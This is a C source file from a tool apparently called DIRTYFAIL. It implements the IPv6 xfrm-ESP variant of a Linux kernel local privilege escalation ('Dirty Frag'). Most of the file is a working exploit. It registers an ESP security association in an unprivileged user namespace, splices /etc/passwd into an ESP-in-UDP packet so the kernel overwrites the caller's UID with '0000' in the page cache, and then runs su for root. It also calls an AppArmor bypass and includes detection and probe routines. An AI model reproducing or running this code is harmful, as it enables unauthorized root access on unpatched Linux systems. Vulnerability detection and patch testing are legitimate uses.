/*
 * DIRTYFAIL — dirtyfrag_esp6.c — Dirty Frag IPv6 xfrm-ESP variant
 *                                CVE-2026-43284 (IPv6 path)
 *
 * Reuses the same primitive shape as `dirtyfrag_esp.c`. See that file
 * for the underlying root-cause analysis. This module differs only in
 * the network-layer transport (AF_INET6 / ::1) and in padding the ESP
 * frame to clear the v6-only size gate.
 */

#include "dirtyfrag_esp6.h"
#include "apparmor_bypass.h"

#include <fcntl.h>
#include <pwd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#ifdef __linux__
#include <sched.h>
#include <sys/syscall.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <linux/if.h>
#include <sys/ioctl.h>

extern ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out,
                      size_t len, unsigned int flags);
extern ssize_t vmsplice(int fd, const struct iovec *iov, unsigned long nr,
                        unsigned int flags);
#endif

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef IPPROTO_ESP
#define IPPROTO_ESP 50
#endif

#define ENCAP_PORT 4500
#define ESP_SPI    0xDEADBE60
#define MARKER     "0000"
#define ALG_NAME   "authencesn(hmac(sha256),cbc(aes))"

/* xfrm6_input.c rejects skb->len < 48. Our wire layout is
 * SPI(4)+seq(4)+IV(16)+target(16)+pad = 40+pad. Pad to 48 bytes. */
#define V6_PAD_BYTES 8

/* Empirical STORE-offset shift between v4 and v6 paths.
 *
 * In v4, the authencesn scratch-write at dst[assoclen+cryptlen]=dst[24]
 * lands at file_offset == splice_off (we proved this end-to-end on Ubuntu
 * 24.04, kernel 6.8.0-111). In v6, with our [hdr(24)][passwd(16)][pad(8)]
 * wire layout, the STORE empirically lands at splice_off + 9. The exact
 * source of the +9 isn't fully understood (likely a frag-vs-linear
 * accounting wrinkle in esp6_input's skb_to_sgvec), but it is consistent
 * across runs at this kernel revision.
 *
 * We compensate by splicing from passwd_off - V6_STORE_SHIFT, so the
 * STORE lands at the intended target offset. Re-test on different kernel
 * versions; this constant may need recalibration. */
#define V6_STORE_SHIFT  9

/* ---------------------------------------------------------------- *
 * Detection
 * ---------------------------------------------------------------- */

df_result_t dirtyfrag_esp6_detect(void)
{
    log_step("Dirty Frag — IPv6 xfrm-ESP variant (CVE-2026-43284 v6 path) — detection");

    int km = -1, kn = -1;
    if (kernel_version(&km, &kn))
        log_hint("kernel %d.%d.x", km, kn);

    bool esp6 = kmod_loaded("esp6");
    log_hint("esp6 currently loaded: %s", esp6 ? "yes" : "no");

    bool userns = unprivileged_userns_allowed();
    log_hint("unprivileged user namespace: %s", userns ? "allowed" : "DENIED");

    if (!userns) {
        log_ok("v6 xfrm-ESP variant unreachable without unprivileged userns");
        log_hint("if you are on Ubuntu, try with --aa-bypass to defeat the restriction");
        return DF_PRECOND_FAIL;
    }

    /* Quick AF_INET6 reachability probe. */
    int s = socket(AF_INET6, SOCK_DGRAM, 0);
    if (s < 0) {
        log_ok("AF_INET6 unavailable (%s) — v6 path not reachable",
               strerror(errno));
        return DF_PRECOND_FAIL;
    }
    close(s);

    if (apparmor_userns_caps_blocked()) {
        log_ok("LSM-mitigated — same hardening that blocks v4 also blocks v6 "
               "(unprivileged userns has no caps).");
        return DF_PRECOND_FAIL;
    }

    if (dirtyfail_active_probes) {
        log_step("--active set: firing v6 ESP-in-UDP trigger against /tmp sentinel");
        df_result_t pr = dirtyfrag_esp6_active_probe();
        if (pr == DF_VULNERABLE || pr == DF_OK || pr == DF_PRECOND_FAIL) return pr;
        log_warn("active probe inconclusive — falling back to precondition verdict");
    }

    log_warn("VULNERABLE (preconditions met) — v6 xfrm SA registration available");
    log_warn("Apply mainline patch f4c50a4034e6 (covers both v4 and v6)");
    log_warn("Some distro backports may have shipped v4-only — test both paths");
    log_hint("re-run with `--scan --active` for an empirical sentinel-STORE probe");
    return DF_VULNERABLE;
}

/* ---------------------------------------------------------------- *
 * Exploit
 * ---------------------------------------------------------------- */

#ifdef __linux__

static bool wproc(const char *path, const char *value)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return false;
    ssize_t n = write(fd, value, strlen(value));
    close(fd);
    return n == (ssize_t)strlen(value);
}

static bool xfrm6_register_sa(int nl, const unsigned char seq_hi[4])
{
    char buf[2048] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct xfrm_usersa_info *usa =
        (struct xfrm_usersa_info *)NLMSG_DATA(nlh);

    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq   = 1;

    /* IPv6 selectors / SA addresses. ::1 = {0,...,0,1}. */
    static const struct in6_addr loop6 = IN6ADDR_LOOPBACK_INIT;
    memcpy(&usa->sel.daddr.a6, &loop6, 16);
    memcpy(&usa->sel.saddr.a6, &loop6, 16);
    usa->sel.family   = AF_INET6;
    usa->sel.prefixlen_d = 128;
    usa->sel.prefixlen_s = 128;

    memcpy(&usa->id.daddr.a6, &loop6, 16);
    usa->id.spi   = htonl(ESP_SPI);
    usa->id.proto = IPPROTO_ESP;

    memcpy(&usa->saddr.a6, &loop6, 16);

    usa->lft.soft_byte_limit   = (uint64_t)-1;
    usa->lft.hard_byte_limit   = (uint64_t)-1;
    usa->lft.soft_packet_limit = (uint64_t)-1;
    usa->lft.hard_packet_limit = (uint64_t)-1;

    usa->reqid     = 0x1234;
    usa->family    = AF_INET6;            /* <-- v6 */
    usa->mode      = XFRM_MODE_TRANSPORT;
    usa->replay_window = 0;       /* SA-level: 0; ESN-level (below): 32 */
    usa->flags     = XFRM_STATE_ESN;

    size_t hdrlen = sizeof(*nlh) + sizeof(*usa);
    size_t attrs  = 0;
    char *abuf = buf + hdrlen;

    /*
     * Same authencesn-as-composition story as the v4 path — see the
     * comment block in dirtyfrag_esp.c::xfrm_register_sa for why we
     * register two separate attributes instead of XFRMA_ALG_AEAD.
     */
    {  /* XFRMA_ALG_AUTH_TRUNC */
        struct xfrm_algo_auth *aa;
        unsigned short dlen = sizeof(*aa) + 32;
        struct rtattr *r = (struct rtattr *)(abuf + attrs);
        r->rta_type = XFRMA_ALG_AUTH_TRUNC;
        r->rta_len  = RTA_LENGTH(dlen);
        aa = (struct xfrm_algo_auth *)RTA_DATA(r);
        memset(aa, 0, dlen);
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
        aa->alg_key_len   = 32 * 8;
        aa->alg_trunc_len = 128;
        attrs += RTA_SPACE(dlen);
    }
    {  /* XFRMA_ALG_CRYPT */
        struct xfrm_algo *ea;
        unsigned short dlen = sizeof(*ea) + 16;
        struct rtattr *r = (struct rtattr *)(abuf + attrs);
        r->rta_type = XFRMA_ALG_CRYPT;
        r->rta_len  = RTA_LENGTH(dlen);
        ea = (struct xfrm_algo *)RTA_DATA(r);
        memset(ea, 0, dlen);
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
        ea->alg_key_len = 16 * 8;
        attrs += RTA_SPACE(dlen);
    }
    {  /* XFRMA_REPLAY_ESN_VAL — same primitive input as v4 */
        struct xfrm_replay_state_esn *esn;
        unsigned short dlen = sizeof(*esn) + 4;
        struct rtattr *r = (struct rtattr *)(abuf + attrs);
        r->rta_type = XFRMA_REPLAY_ESN_VAL;
        r->rta_len  = RTA_LENGTH(dlen);
        esn = (struct xfrm_replay_state_esn *)RTA_DATA(r);
        memset(esn, 0, dlen);
        esn->bmp_len       = 1;
        esn->seq           = 100;
        memcpy(&esn->seq_hi, seq_hi, 4);
        esn->replay_window = 32;
        attrs += RTA_SPACE(dlen);
    }
    {  /* XFRMA_ENCAP — UDP/4500 */
        struct xfrm_encap_tmpl *enc;
        unsigned short dlen = sizeof(*enc);
        struct rtattr *r = (struct rtattr *)(abuf + attrs);
        r->rta_type = XFRMA_ENCAP;
        r->rta_len  = RTA_LENGTH(dlen);
        enc = (struct xfrm_encap_tmpl *)RTA_DATA(r);
        memset(enc, 0, dlen);
        enc->encap_type  = UDP_ENCAP_ESPINUDP;
        enc->encap_sport = htons(ENCAP_PORT);
        enc->encap_dport = htons(ENCAP_PORT);
        attrs += RTA_SPACE(dlen);
    }

    nlh->nlmsg_len = hdrlen + attrs;

    struct sockaddr_nl nladdr = { .nl_family = AF_NETLINK };
    if (sendto(nl, buf, nlh->nlmsg_len, 0,
               (struct sockaddr *)&nladdr, sizeof(nladdr)) < 0)
        return false;

    char ack[4096];
    ssize_t n = recv(nl, ack, sizeof(ack), 0);
    if (n < (ssize_t)sizeof(struct nlmsghdr)) return false;
    struct nlmsghdr *r = (struct nlmsghdr *)ack;
    if (r->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(r);
        if (e->error != 0) {
            log_bad("XFRM_MSG_NEWSA(v6): %s", strerror(-e->error));
            return false;
        }
    }
    return true;
}

static bool bring_lo_up_v6(void)
{
    int s = socket(AF_INET6, SOCK_DGRAM, 0);
    if (s < 0) return false;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
    ifr.ifr_flags = IFF_UP | IFF_RUNNING;
    int rc = ioctl(s, SIOCSIFFLAGS, &ifr);
    close(s);
    return rc == 0;
}

/* Generalized v6 trigger: splice from `target_path` at `splice_off`,
 * len 16 bytes. The STORE lands at file_offset (splice_off + shift)
 * where `shift` is empirically determined per-kernel (see
 * calibrate_v6_shift below). Use this directly if you already know
 * the shift; for the production exploit path, callers go through
 * trigger_store_v6() which compensates automatically. */
static bool trigger_store_v6_at(const char *target_path, loff_t splice_off)
{
    int udp_recv = socket(AF_INET6, SOCK_DGRAM, 0);
    if (udp_recv < 0) return false;
    struct sockaddr_in6 addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin6_family = AF_INET6;
    addr.sin6_port   = htons(ENCAP_PORT);
    addr.sin6_addr   = in6addr_loopback;

    int reuse = 1;
    setsockopt(udp_recv, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    if (bind(udp_recv, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        log_bad("bind v6 udp_recv: %s", strerror(errno));
        close(udp_recv); return false;
    }
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(udp_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
        log_bad("UDP_ENCAP v6: %s", strerror(errno));
        close(udp_recv); return false;
    }

    int udp_send = socket(AF_INET6, SOCK_DGRAM, 0);
    if (udp_send < 0) { close(udp_recv); return false; }
    if (connect(udp_send, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        log_bad("connect v6 udp_send: %s", strerror(errno));
        close(udp_recv); close(udp_send); return false;
    }

    /* Wire ESP header (24B) — same as v4. */
    unsigned char wire_hdr[24];
    *(uint32_t *)(wire_hdr + 0) = htonl(ESP_SPI);
    *(uint32_t *)(wire_hdr + 4) = htonl(101);
    memset(wire_hdr + 8, 0xCC, 16);

    /* v6 padding to clear the size gate. */
    unsigned char pad[V6_PAD_BYTES] = {0};

    int pfd = open(target_path, O_RDONLY);
    if (pfd < 0) {
        log_bad("open %s: %s", target_path, strerror(errno));
        close(udp_recv); close(udp_send); return false;
    }

    int p[2];
    if (pipe(p) < 0) {
        log_bad("pipe: %s", strerror(errno));
        close(pfd); close(udp_recv); close(udp_send); return false;
    }

    /* Compose: hdr(24) || target@off(16) || pad(V6_PAD_BYTES) */
    struct iovec iov_hdr = { .iov_base = wire_hdr, .iov_len = sizeof(wire_hdr) };
    if (vmsplice(p[1], &iov_hdr, 1, 0) != (ssize_t)sizeof(wire_hdr)) {
        log_bad("vmsplice hdr: %s", strerror(errno));
        goto fail;
    }
    {
        loff_t off = splice_off;
        if (splice(pfd, &off, p[1], NULL, 16, SPLICE_F_MOVE) != 16) {
            log_bad("splice file->pipe: %s", strerror(errno));
            goto fail;
        }
    }
    {
        struct iovec iov_pad = { .iov_base = pad, .iov_len = V6_PAD_BYTES };
        if (vmsplice(p[1], &iov_pad, 1, 0) != V6_PAD_BYTES) {
            log_bad("vmsplice pad: %s", strerror(errno));
            goto fail;
        }
    }
    if (splice(p[0], NULL, udp_send, NULL,
               24 + 16 + V6_PAD_BYTES, SPLICE_F_MOVE)
            != 24 + 16 + V6_PAD_BYTES) {
        log_bad("splice pipe->udp v6: %s", strerror(errno));
        goto fail;
    }
    close(p[0]); close(p[1]);

    /* See the comment in dirtyfrag_esp.c::trigger_store on why we
     * need to wait before tearing down sockets. */
    usleep(150 * 1000);
    unsigned char drain[256];
    (void)recv(udp_recv, drain, sizeof(drain), MSG_DONTWAIT);

    close(pfd); close(udp_recv); close(udp_send);
    return true;

fail:
    close(p[0]); close(p[1]);
    close(pfd); close(udp_recv); close(udp_send);
    return false;
}

/* Calibrate V6_STORE_SHIFT empirically against a sentinel file in /tmp.
 *
 * We fire the v6 trigger once with marker bytes "0000" spliced from
 * sentinel offset 0, then re-read the sentinel and find where "0000"
 * landed. The offset is the kernel's STORE shift for this build of
 * esp6_input. Caller then splices from `uid_off - shift` for the real
 * exploit so the STORE lands exactly at uid_off.
 *
 * Returns shift in [0, 64) on success, or -1 if the marker didn't land
 * at all (kernel may be patched, or trigger setup failed). */
static int calibrate_v6_shift(void)
{
    /* Build a 4 KiB sentinel filled with a recognizable pattern that
     * cannot collide with our marker "0000". We use ASCII 'A' bytes. */
    char tmpl[] = "/tmp/dirtyfail-v6-cal.XXXXXX";
    int sfd = mkstemp(tmpl);
    if (sfd < 0) { log_bad("calibration: mkstemp: %s", strerror(errno)); return -1; }
    unsigned char filler[4096];
    memset(filler, 'A', sizeof(filler));
    if (write(sfd, filler, sizeof(filler)) != (ssize_t)sizeof(filler)) {
        close(sfd); unlink(tmpl); return -1;
    }
    close(sfd);

    /* Fault the page in. */
    int rfd = open(tmpl, O_RDONLY);
    if (rfd < 0) { unlink(tmpl); return -1; }
    char tmp[4096];
    if (read(rfd, tmp, sizeof(tmp)) != (ssize_t)sizeof(tmp)) {
        close(rfd); unlink(tmpl); return -1;
    }
    close(rfd);

    /* Fire the trigger from sentinel offset 0. The trigger's wire
     * packet carries seq_hi="0000" (MARKER), so the STORE writes those
     * 4 bytes somewhere in the sentinel page. */
    bool ok = trigger_store_v6_at(tmpl, 0);
    if (!ok) {
        log_bad("calibration: v6 trigger failed");
        unlink(tmpl);
        return -1;
    }

    /* Re-read the sentinel via a fresh fd (page-cache view, not disk). */
    rfd = open(tmpl, O_RDONLY);
    if (rfd < 0) { unlink(tmpl); return -1; }
    unsigned char after[64];
    ssize_t got = read(rfd, after, sizeof(after));
    close(rfd);
    unlink(tmpl);
    if (got <= 0) return -1;

    /* Search the first 64 bytes for the marker. We expect it to land
     * within ~32 bytes of offset 0 based on prior empirical tests. */
    for (int i = 0; i + 4 <= got; i++) {
        if (memcmp(after + i, MARKER, 4) == 0) {
            log_ok("v6 calibration: STORE landed at sentinel offset %d", i);
            return i;
        }
    }
    log_warn("v6 calibration: marker '%s' did not land in sentinel — "
             "kernel may be patched, or trigger didn't fire", MARKER);
    return -1;
}

/* Production v6 trigger: calibrates the shift on first call, then
 * splices from passwd_off - shift so the STORE lands at passwd_off. */
static int g_v6_shift = -1;   /* lazy-init by trigger_store_v6 */

static bool trigger_store_v6(off_t passwd_off)
{
    if (g_v6_shift < 0) {
        g_v6_shift = calibrate_v6_shift();
        if (g_v6_shift < 0) {
            log_warn("v6 calibration failed; falling back to hard-coded "
                     "V6_STORE_SHIFT=%d (may be wrong for this kernel)",
                     V6_STORE_SHIFT);
            g_v6_shift = V6_STORE_SHIFT;
        }
    }
    loff_t off = (passwd_off >= g_v6_shift) ? passwd_off - g_v6_shift : 0;
    return trigger_store_v6_at("/etc/passwd", off);
}

__attribute__((unused))

static int run_v6_in_userns(off_t passwd_off, uid_t real_uid, gid_t real_gid)
{
    if (syscall(SYS_unshare, CLONE_NEWUSER | CLONE_NEWNET) != 0) {
        log_bad("unshare v6: %s", strerror(errno));
        return 1;
    }
    wproc("/proc/self/setgroups", "deny");
    char m[64];
    snprintf(m, sizeof(m), "0 %u 1", (unsigned)real_uid);
    wproc("/proc/self/uid_map", m);
    snprintf(m, sizeof(m), "0 %u 1", (unsigned)real_gid);
    wproc("/proc/self/gid_map", m);
    if (!bring_lo_up_v6()) {
        log_bad("bring lo up (v6): %s", strerror(errno));
        return 1;
    }

    int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (nl < 0) { log_bad("netlink xfrm: %s", strerror(errno)); return 1; }
    struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
    if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
        log_bad("bind netlink: %s", strerror(errno));
        close(nl); return 1;
    }

    if (!xfrm6_register_sa(nl, (const unsigned char *)MARKER)) {
        close(nl); return 1;
    }
    log_ok("v6 XFRM SA registered with seq_hi='%s'", MARKER);

    if (!trigger_store_v6(passwd_off)) { close(nl); return 1; }
    log_ok("v6 ESP-in-UDP trigger fired");

    close(nl);
    return 0;
}

#else
__attribute__((unused))
static int run_v6_in_userns(off_t a, uid_t b, gid_t c) {
    (void)a; (void)b; (void)c; return 1;
}
#endif

/* INNER (bypass userns): SA reg + trigger only. */
df_result_t dirtyfrag_esp6_exploit_inner(void)
{
#ifdef __linux__
    const char *user = getenv("DIRTYFAIL_TARGET_USER");
    if (!user || !*user) {
        log_bad("inner: DIRTYFAIL_TARGET_USER not set");
        return DF_TEST_ERROR;
    }
    off_t  uid_off; size_t uid_len; char uid_str[16];
    if (!find_passwd_uid_field(user, &uid_off, &uid_len, uid_str)) {
        log_bad("inner: find_passwd_uid_field('%s') failed", user);
        return DF_TEST_ERROR;
    }
    if (uid_len != 4) {
        log_bad("inner: UID '%s' not 4 chars", uid_str);
        return DF_TEST_ERROR;
    }

    int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (nl < 0) { log_bad("inner: netlink xfrm: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
    struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
    if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
        log_bad("inner: bind netlink: %s", strerror(errno));
        close(nl); return DF_EXPLOIT_FAIL;
    }
    if (!xfrm6_register_sa(nl, (const unsigned char *)MARKER)) {
        close(nl); return DF_EXPLOIT_FAIL;
    }
    log_ok("inner: v6 XFRM SA registered with seq_hi='%s'", MARKER);
    if (!trigger_store_v6(uid_off)) { close(nl); return DF_EXPLOIT_FAIL; }
    log_ok("inner: v6 ESP-in-UDP trigger fired at uid_off=%lld", (long long)uid_off);
    close(nl);
    return DF_EXPLOIT_OK;
#else
    return DF_TEST_ERROR;
#endif
}

/* OUTER (init ns): prompts → fork bypass child → wait → verify → su. */
df_result_t dirtyfrag_esp6_exploit(bool do_shell)
{
    log_step("Dirty Frag (IPv6 xfrm-ESP) — exploit");

    uid_t uid = getuid();
    if (uid == 0) {
        log_warn("already root in init namespace — nothing to escalate");
        return DF_OK;
    }
    struct passwd *pw = getpwuid(uid);
    if (!pw) { log_bad("getpwuid: %s", strerror(errno)); return DF_TEST_ERROR; }
    const char *user = pw->pw_name;

    off_t  uid_off; size_t uid_len; char uid_str[16];
    if (!find_passwd_uid_field(user, &uid_off, &uid_len, uid_str)) {
        log_bad("could not find %s in /etc/passwd", user);
        return DF_TEST_ERROR;
    }
    log_step("/etc/passwd UID for %s: '%s' at offset %lld",
             user, uid_str, (long long)uid_off);
    if (uid_len != 4) {
        log_bad("UID '%s' is %zu chars; need 4", uid_str, uid_len);
        return DF_TEST_ERROR;
    }

    log_warn("about to run xfrm-ESP6 page-cache write against /etc/passwd");
    log_warn("over ::1 with %d-byte padding to clear xfrm6_input size gate",
             V6_PAD_BYTES);
    if (!typed_confirm("DIRTYFAIL")) { log_bad("confirmation declined"); return DF_OK; }
    if (!ssh_lockout_check(user))   { log_bad("ssh-lockout declined");    return DF_OK; }

    setenv("DIRTYFAIL_INNER_MODE",  "esp6", 1);
    setenv("DIRTYFAIL_TARGET_USER", user,   1);

    int rc = apparmor_bypass_fork_arm(0, NULL);
    if (rc != DF_EXPLOIT_OK) {
        log_bad("inner exploit failed (exit=%d)", rc);
        return DF_EXPLOIT_FAIL;
    }

    int v = open("/etc/passwd", O_RDONLY);
    if (v < 0) { log_bad("verify open: %s", strerror(errno)); return DF_EXPLOIT_FAIL; }
    if (lseek(v, uid_off, SEEK_SET) != uid_off) { close(v); return DF_EXPLOIT_FAIL; }
    char land[5] = {0};
    if (read(v, land, 4) != 4) { close(v); return DF_EXPLOIT_FAIL; }
    close(v);
    if (memcmp(land, MARKER, 4) != 0) {
        log_bad("v6 write did not land — page cache reads '%.4s'", land);
        return DF_EXPLOIT_FAIL;
    }
    log_ok("page cache now reports %s with uid 0 (via v6 path)", user);

    if (!do_shell) {
        if (try_revert_passwd_page_cache())
            log_ok("page cache reverted (--no-shell)");
        else
            log_warn("page cache may still be modified — `sudo dirtyfail --cleanup` or reboot");
        return DF_EXPLOIT_OK;
    }

    log_ok("invoking 'su %s' in init namespace — enter your password for REAL root", user);
    execlp("su", "su", user, (char *)NULL);
    log_bad("execlp: %s", strerror(errno));
    return DF_EXPLOIT_FAIL;
}

/* ---------------------------------------------------------------- *
 * Active probe — used by `--scan --active`.
 *
 * Same shape as the v4 active probe: registers an SA in a fresh
 * userns and fires the trigger against a sentinel /tmp file. The
 * parent re-reads the sentinel and looks for the marker.
 * ---------------------------------------------------------------- */

df_result_t dirtyfrag_esp6_active_probe_inner(void)
{
#ifdef __linux__
    const char *sentinel = getenv("DIRTYFAIL_PROBE_SENTINEL");
    if (!sentinel || !*sentinel) {
        log_bad("active-probe v6: DIRTYFAIL_PROBE_SENTINEL not set");
        return DF_TEST_ERROR;
    }
    if (!bring_lo_up_v6()) {
        log_bad("active-probe v6: bring lo up: %s", strerror(errno));
        return DF_TEST_ERROR;
    }
    int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (nl < 0) {
        log_bad("active-probe v6: netlink xfrm: %s", strerror(errno));
        return DF_TEST_ERROR;
    }
    struct sockaddr_nl nla = { .nl_family = AF_NETLINK };
    if (bind(nl, (struct sockaddr *)&nla, sizeof(nla)) < 0) {
        log_bad("active-probe v6: bind netlink: %s", strerror(errno));
        close(nl); return DF_TEST_ERROR;
    }
    if (!xfrm6_register_sa(nl, (const unsigned char *)MARKER)) {
        close(nl); return DF_TEST_ERROR;
    }
    /* Splice from sentinel offset 0; we don't need uid_off math here. */
    if (!trigger_store_v6_at(sentinel, 0)) {
        close(nl); return DF_TEST_ERROR;
    }
    close(nl);
    return DF_EXPLOIT_OK;
#else
    return DF_TEST_ERROR;
#endif
}

df_result_t dirtyfrag_esp6_active_probe(void)
{
    char tmpl[] = "/tmp/dirtyfail-esp6-probe.XXXXXX";
    int sfd = mkstemp(tmpl);
    if (sfd < 0) { log_bad("probe v6 mkstemp: %s", strerror(errno)); return DF_TEST_ERROR; }
    unsigned char filler[4096];
    memset(filler, 'A', sizeof(filler));
    if (write(sfd, filler, sizeof(filler)) != (ssize_t)sizeof(filler)) {
        close(sfd); unlink(tmpl); return DF_TEST_ERROR;
    }
    close(sfd);

    int rfd = open(tmpl, O_RDONLY);
    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
    char tmp[4096];
    if (read(rfd, tmp, sizeof(tmp)) != (ssize_t)sizeof(tmp)) {
        close(rfd); unlink(tmpl); return DF_TEST_ERROR;
    }
    close(rfd);

    setenv("DIRTYFAIL_INNER_MODE",     "esp6-probe", 1);
    setenv("DIRTYFAIL_PROBE_SENTINEL", tmpl,         1);
    int rc = apparmor_bypass_fork_arm(0, NULL);
    unsetenv("DIRTYFAIL_INNER_MODE");
    unsetenv("DIRTYFAIL_PROBE_SENTINEL");

    if (rc == DF_PRECOND_FAIL) { unlink(tmpl); return DF_PRECOND_FAIL; }
    if (rc != DF_EXPLOIT_OK)   {
        log_bad("active-probe v6 inner failed (exit=%d)", rc);
        unlink(tmpl); return DF_TEST_ERROR;
    }

    rfd = open(tmpl, O_RDONLY);
    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
    unsigned char after[64];
    ssize_t got = read(rfd, after, sizeof(after));
    close(rfd);
    unlink(tmpl);
    if (got <= 0) return DF_TEST_ERROR;

    for (int i = 0; i + 4 <= got; i++) {
        if (memcmp(after + i, MARKER, 4) == 0) {
            log_warn("ACTIVE PROBE v6: STORE landed at offset %d → kernel is VULNERABLE", i);
            return DF_VULNERABLE;
        }
    }
    log_ok("ACTIVE PROBE v6: page intact — kernel esp6 path appears patched");
    return DF_OK;
}
